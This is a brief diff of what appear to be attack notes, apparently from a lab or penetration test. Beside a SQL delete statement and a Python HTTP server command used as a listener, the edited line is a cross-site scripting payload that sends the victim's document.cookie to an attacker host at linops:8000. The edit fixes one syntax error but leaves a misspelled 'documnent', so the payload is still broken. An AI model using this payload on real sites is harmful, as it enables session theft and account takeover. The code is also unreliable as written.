@@ -518,7 +518,7 @@ delete from comments where id = <ID>
 
 
 python3 -m http.server
-<script>documnent.location="http://linops:8000/"+=document.cookie;</script>
+<script>documnent.location="http://linops:8000/"+document.cookie;</script>
 
 
 
